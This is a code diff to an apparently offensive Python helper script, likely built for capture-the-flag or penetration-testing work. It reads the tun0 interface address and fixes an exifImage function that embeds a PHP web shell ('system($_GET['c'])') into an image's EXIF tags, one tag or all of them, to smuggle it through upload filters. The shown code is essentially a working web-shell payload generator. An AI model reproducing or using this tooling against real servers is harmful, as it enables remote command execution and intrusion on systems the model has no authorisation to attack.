@@ -6,8 +6,9 @@ import netifaces as ni
 import requests
 import sys
 import exif
-import PIL
 import os
+import io
+from PIL import Image
 from bs4 import BeautifulSoup
 
 def getAddress(interface="tun0"):
@@ -105,22 +106,22 @@ def pad(x, n):
 
 def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):
 
-    if _in is None:
-        _in = PIL.Image.new(Image.RGB, (10,10), (255,255,255))
+    if _in is None or (isinstance(_in, str) and not os.path.exists(_in)):
+        _in = Image.new("RGB", (50,50), (255,255,255))
 
     if isinstance(_in, str):
         _in = exif.Image(open(_in, "rb"))
-    elif isinstance(_in, PIL.Image):
+    elif isinstance(_in, Image.Image):
         bytes = io.BytesIO()
-        img.save(bytes)
-        _in = exif.Image(bytes)
+        _in.save(bytes, format='PNG')
+        _in = exif.Image(bytes.getvalue())
     elif not isinstance(_in, exif.Image):
         print("Invalid input. Either give an Image or a path to an image.")
         return
 
     valid_tags = list(exif._constants.ATTRIBUTE_NAME_MAP.values())
     if exif_tag is None:
-        exif_tag = "image_description"
+        _in.image_description = payload
     elif exif_tag == "all":
         for exif_tag in valid_tags:
             try:
@@ -139,7 +140,6 @@ def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_t
     if _out is None:
         sys.stdout.write(_in.get_file())
         sys.stdout.flush()
-
     elif isinstance(_out, str):
         with open(_out, "wb") as f:
             f.write(_in.get_file())
